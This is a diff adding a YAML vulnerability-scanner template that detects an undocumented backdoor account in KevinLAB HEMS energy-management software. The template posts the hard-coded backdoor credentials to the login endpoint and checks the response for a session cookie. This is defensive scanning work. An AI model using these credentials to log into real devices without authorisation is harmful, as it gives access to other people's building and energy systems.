@@ -1,0 +1,39 @@
+id: kevinlab-hems-backdoor
+brief:
+    title: KevinLAB HEMS - Backdoor Detection
+    by: gy741
+    level: critical
+    about: KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI...
+    label:
+        - kevinlab
+        - default-login
+        - backdoor
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/dashboard/proc.php?type=login'
+      head:
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: userid=kevinlab&userpass=kevin003
+      signs:
+        - "on": word
+          has:
+            - <meta http-equiv="refresh" content="0; url=/"></meta>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - <script> alert
+          in: body
+          need: all
+        - "on": word
+          has:
+            - PHPSESSID
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
